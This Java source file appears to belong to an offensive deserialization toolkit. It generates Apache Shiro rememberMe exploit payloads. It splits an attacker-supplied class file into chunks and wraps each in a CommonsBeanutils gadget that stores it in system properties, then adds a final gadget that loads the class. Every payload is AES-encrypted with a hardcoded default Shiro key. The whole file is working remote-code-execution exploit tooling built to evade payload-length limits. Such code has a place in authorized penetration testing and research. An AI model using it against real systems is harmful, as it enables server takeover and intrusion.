package cn.butler.yso.exploit;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.Serializer;
import org.apache.shiro.Encrypt.CbcEncrypt;
import org.apache.shiro.Encrypt.ShiroGCM;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Base64;

public class ShiroChunkPayload {
    public static String gadget = "CommonsBeanutils2";
    public static String aesModel = "CBC";
    public static String shirokey = "kPH+bIxk5D2deZiIxcaaaA==";
    public static String fileClassByteCode;
    public static String fileOutput;
    public static void main(String[] args) throws Exception{
        // 解析命令行参数
        for (int i = 0; i < args.length; i ++ ) {
            switch (args[i]) {
                case "-h":
                    System.out.println("Usage: java -cp ysoSimple.jar cn.butler.yso.exploit.ShiroChunkPayload [-g <gadget>] [-m <aseModel>] [-k <shiroKey>] [-f <fileClassByteCode>] [-o <fileOutput>] [-h]");
                    return;
                case "-g":
                    gadget = args[i+1];
                    break;
                case "-m":
                    aesModel = args[i+1];
                    break;
                case "-k":
                    shirokey = args[i+1];
                    break;
                case "-f":
                    fileClassByteCode = args[i+1];
                    break;
                case "-o":
                    fileOutput = args[i+1];
                    break;
            }
        }
//        String gadget = args[0];
//        String aesModel = args[1];
//        String shirokey = args[2];
        // 文件中是字节码的位置
//        String fileClassByteCode = args[3];
        String base64 = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(fileClassByteCode)));
//        String fileName = args[4];
        System.out.println("[+] Yso Gadget: " + gadget);
        System.out.println("[+] Shiro AES Model: " + aesModel);
        System.out.println("[+] Shiro Key: " + shirokey);
        System.out.println("[+] Base64 ClassData Length: " + base64.length());
        System.out.println("[+] Chunk Payload Write To: " + fileOutput);
        System.out.println("----------------------------------------");
        // 定义每个数据块的大小为1000字符
        int groupSize = 1000;
        // 获取Base64字符串的长度
        int length = base64.length();
        // 初始化起始索引为0,表示从字符串的第一个字符开始处理
        int startIndex = 0;
        // 计算结束索引,确保不超过字符串的总长度，取较小值
        int endIndex = Math.min(length, groupSize);
        // 分块数量
        int a = 1;

        //分块设置系统属性的反序列化Gadget生成
        System.out.println("[*] 开始生成设置系统属性的Payload:");
        while (startIndex < length) {
            String group = base64.substring(startIndex, endIndex);
            startIndex = endIndex; //ShiroChunk
            endIndex = Math.min(startIndex + groupSize, length);
            String command =  "Templateslmpl:system_set_property:" + String.valueOf(a) + ":" + group;
            //序列化Gadget
            Object gadgetPayload = ysoGadgetGenerate(gadget, command);
            //AES加密
            String aesEncryptPayload = aesEncryptGenerate(gadgetPayload,aesModel,shirokey);
            String describe = String.format("[*] 第 %d 组数据长度为: %d",a,aesEncryptPayload.length());
            System.out.println(describe);
            System.out.println(aesEncryptPayload);
            appendToFile(fileOutput,aesEncryptPayload);
            System.out.println("----------------------------------------");
            a++;
        }

        System.out.println(String.format("[*] 写入分块设置系统属性的反序列化Gadget到 %s 中",fileOutput));
        System.out.println("----------------------------------------");

        //系统属性类加载的反序列化Gadget生成
        System.out.println("[*] 开始生成类加载的Payload:");
        String command = "Templateslmpl:system_property_classloader:" + String.valueOf(a);
        //序列化Gadget
        Object gadgetPayload = ysoGadgetGenerate(gadget, command);
        //AES加密
        String aesEncryptPayload = aesEncryptGenerate(gadgetPayload,aesModel,shirokey);
        String describe = String.format("[*] 系统属性类加载的反序列化Gadget长度为: %d",aesEncryptPayload.length());
        System.out.println(describe);
        System.out.println(aesEncryptPayload);
    }

    /**
     * 生成指定的Yso的Gadget
     * @param gadget
     * @param payload
     * @return
     */
    private static Object ysoGadgetGenerate(String gadget,String payload){
        return ObjectPayload.Utils.makePayloadObject("YsoAttack", gadget, payload);
    }

    /**
     * 序列化Gadget并进行AES加密
     * @param object
     * @param aesModel
     * @param shirokey
     * @return
     * @throws IOException
     */
    private static String aesEncryptGenerate(Object object,String aesModel,String shirokey) throws IOException {
        byte[] serialize = Serializer.serialize(object);
        String encryptPayload = "";
        if(aesModel != null && aesModel.equals("GCM")){
            //AES-GCM,Base64
            ShiroGCM shiroGCM = new ShiroGCM();
            encryptPayload = shiroGCM.encrypt(shirokey,serialize);
        }else {
            //AES-CBC,Base64
            CbcEncrypt cbcEncrypt = new CbcEncrypt();
            encryptPayload = cbcEncrypt.encrypt(shirokey,serialize);
        }
        return encryptPayload;
    }

    /**
     * 将数据追加到文件中，并且每次追加数据时换行
     *
     * @param fileName 文件名
     * @param data 要追加的数据
     */
    public static void appendToFile(String fileName, String data) {
        try {
            //使用 Files.write() 方法追加数据，并在数据前加上换行符
            //StandardOpenOption.CREATE 确保如果文件不存在则会被创建。
            //StandardOpenOption.APPEND 确保数据会被追加到文件末尾，而不是覆盖原有内容。
            Files.write(Paths.get(fileName),("\n" + data).getBytes(),StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
